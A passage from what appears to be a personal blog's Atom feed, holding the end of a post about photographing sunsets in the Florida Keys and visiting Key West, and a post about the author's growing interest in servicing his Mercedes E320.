<p>Around 7:30 PM or so, I started getting to what I consider the &#8220;fertile&#8221; photo-opportunity grounds of the Islamorada area of the Keys. I&#8217;ve shot there before, but this time around, the sky was extremely cooperative.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ohmy.jpg" width="612" height="612" title="'Oh my'" ></p>

<p>I saw the colors and cloud formations, and oddly enough I was very close to the site of my last great landscape piece at the Indian Key Channel. Now, unlike that fortuitous encounter in April, the parking area at Indian Key was packed with people, all in the long-weekend frame of mind. However, no one seemed to mind that I was setting up a bunch of photo equipment. Even a park ranger/Fish and Wildlife cop could care less, it seemed.</p>

<p>I had to work fast though. This was a random stop, yes, but I was here to shoot something. So, I set up, and got to it. The sun was rapidly descending. I know one of the rules of landscape and scenic photography is to get on-site hours beforehand, but sometimes you can&#8217;t make that happen. So, you have to work with what you got.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/keys-4623.jpg" width="960" height="640" title="'Pylons - they go south'" ></p>

<p>There was no wind threatening to carry me off into the sea, so I had a nice stable platform with which to compose. Definitely more &#8220;colorful&#8221; than my last visit. I think I&#8217;m gonna make a little &#8220;project&#8221; out of the Indian Key channel at different times of the year.</p>

<p>Then, finally, I think I nailed it. I moved to the eastern side of &#8220;that bridge&#8221;, and everything just sort of came together. The sun was below the horizon, but still, there was enough light to make the sky interesting, and the bridge became a jagged shadow across the frame. I saw it. One shot, one kill, as it were.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/keys-4648.jpg" width="960" height="1440" title="'Fire away'" ></p>

<p>This one frame made the whole trip worth the effort. They say you know you have a good photo even before you process it, and right there, I knew it. Yellow Shark Channel is officially &#8220;my spot&#8221; now. FYI, the piece above will be for sale later today at <a href="http://dan-vidal.fineartamerica.com/">my Fine Art America</a> site.</p>

<p>I didn&#8217;t end the day there though. I figured I was already most of the way down the highway, so I proceeded on to Key West proper.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/doppler.jpg" width="612" height="612" title="'Doppler'" ></p>

<p>I made it Key West around 10 PM. The scene was in full swing, so I parked and decided to go walkabout, as it were, and take things in. I like Key West itself. It&#8217;s a modern resort town, but the whole atmosphere encourages me to relax. I&#8217;m seriously thinking about figuring out how to maintain a residence down there. It&#8217;s just a different way of life, really. You can just live your life at your own pace, and not worry about the petty bullshit which seemingly consumes Americans these days. No worrying about keeping up with the Joneses, as it were. And again, it&#8217;s not a cradle of ignorance. The whole area is connected and part of the world, they just choose not to get caught up in the &#8220;rat race&#8221;. Maybe in my old (not that old!) age I&#8217;m turning into a bum, I don&#8217;t know.</p>

<p>I did grab a few street scene images, and also scoped out a few potential &#8220;Residence B&#8221; places. I&#8217;d actually be into a timeshare arrangement if the circumstances I have in mind worked out. Eventually I suppose I&#8217;ll become a burnout and just live there. It&#8217;d be kinda nice. Me, a bungalow, and a boat. Though that bungalow would be pretty high-tech. I do love my toys. And I&#8217;d get one of those covers for the 210 so it&#8217;s nice and safe from the seagulls and parrots.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/sloppy.jpg" width="960" height="960" title="'sloppy'" ></p>

<p>There&#8217;s just a certain allure to it, you know? You can just kind of be there, do what you need to in order to provide shelter and the essentials of life, and not get caught up in the petty antics of society. Like I said at the start of this article, everyone, whether they are tourists or locals, seems to be just fine with letting things be. They&#8217;re not caught up in the rat race of wealth accumulation, and are just about enjoying life, and not rotting away flying a desk somewhere. Hey, if flying a desk is your thing, go for it, but I personally have other things in mind.</p>

<p>Maybe they&#8217;re on to something down there. I&#8217;ll be back more often, for sure.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[I guess I am becoming a car guy?]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/08/31/i-guess-i-am-becoming-a-car-guy/"/>
    <updated>2012-08-31T15:10:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/08/31/i-guess-i-am-becoming-a-car-guy</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/210hella960.jpg" width="960" height="360" title="'210 Hella'" ></p>

<p>I took my E320 &#8220;the 210&#8221; in for some service at the excellent locally-owned repair shop, <a href="http://masterclassauto.com/">Masterclass Automotive</a> this morning. I got the headlamp lenses swapped for spanking new Hellas and some odd DTC codes diagnosed.</p>

<p>A year or so ago, I didn&#8217;t know what a DTC code was and I sure as hell didn&#8217;t care. Am I becoming a &#8216;car guy&#8217;?</p>

<!-- more -->


<p></p>

<p>Those who have known me for more than a few months know, that for the longest time, I was a dedicated bus rider/taxicab user. I had a monthly Metropass (superseded by the Easy Card) for over ten years. Not out of any sense of financial restriction (well OK at some points of time, yes&#8230;), but more out of a sense of convenience.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/thebus.jpg" width="612" height="612" title="'The Bus'" ></p>

<p>However, during my temporary exile to Vegas, I was pretty much forced into getting a personal vehicle. Vegas has public transport, but it only covered about 30 percent of the valley, and even then only during daytime hours. Forget about nighttime buses.</p>

<p>At first, AMG was kind enough to provide me with a rental for the times I was actually on the ground in Vegas. It was a serviceable Ford Focus, and did the job as it were. But spending $2K+ a month to give me wheels didn&#8217;t quite fit their budget, so after my Tiësto tour gig and prior to me running out the lease in Vegas, I had to acquire my own vehicle. A few options presented themselves, most notably of which was the vehicle I now own, the Mercedes E320.</p>

<p>Now, not being a car expert as it were, I had to call on some assistance to evaluate the purchase. So, I called on a friend of mine out there who owned a shop, to help me evaluate the Benz. In not so many words, it turned out to be a gem. It ran stable and was a good performer for the price, and he left it at &#8220;If you don&#8217;t buy it, I will&#8230;&#8221;. So, sold! I was suddenly a Mercedes owner.</p>

<p>However, as it is an older vehicle, I was advised to get it serviced and any minor repairs dealt with. I guess this is where my inherent geekiness kicked in. Whenever I purchase a new device, be it a camera, lens, phone, laptop, hard drive, or whatever, I research the hell out of it. I look for the obvious pros and cons, and also any tweaks, upgrades, hacks, and tricks to getting the most out of the device.</p>

<p>But, I guess I never considered a car as being a &#8220;device&#8221;. Suddenly, this whole new world opened up to me. DTC codes, OBD-II ports, chassis numbers, ECU patches and upgrades, tire ratings, curb weights, bus voltages, optimal ranges for RPMs, fuel efficiency, horsepower, etc. It was like dissecting a computer component but there&#8217;s moving parts and physics to call into account too. I guess I got hooked. And, from a pure tech perspective, it&#8217;s great. I actually enjoy the research and the challenge of keeping the W210 up to spec and beyond.</p>

<p>Sidebar: Mercedes, like other manufacturers, typically assigns chassis numbers to certain classes of vehicles. For example, the W210 chassis encompasses the model years 1998-2002 and specifically the E320, E430, E300 turbodiesel, E55 AMG, and a few other models. Most enthusiasts of the brand refer to their cars by the chassis number in addition to the model number. Total geek thing.</p>

<p>But anyways, I guess my inherent need to break something down into it&#8217;s components and see how it all works comes into play. I found out that the headlamp lenses could be replaced, for example. And yes, the more you know, the more you can save by doing things yourself or getting a good lead on what the mechanic will be doing. Each headlamp lens I had swapped in this morning was $85.00 as opposed to $300.00 for the entire housing if I just went with a dealer.</p>

<p>I also actually plan on getting an OBD-II dongle which interfaces with my iPhone. More stats and numbers to obsess over.</p>

<p>And I guess somewhere along the way I started becoming a &#8220;car guy&#8221;. It&#8217;s a fun diversion.</p>

<p>Now, of course I&#8217;m smart about it. I really only drive when I have to, and I still avail myself of public options when it&#8217;s convenient or safe to do so, hence my retaining of my Easy Card and having a Car 2 Go membership. Keeping those options around (I switched my Easy Card to &#8220;refill when needed&#8221;) doesn&#8217;t cost any money unless you use it, so it&#8217;s nice to have a &#8220;B&#8221; and &#8220;C&#8221; option, and a &#8220;too cheap to ride a cab and am going out for a drink or five&#8221; option too.</p>

<p>So, some of the &#8220;old Pod&#8221; still remains. Go figure.</p>
]]></content>
  </entry>
  
</feed>
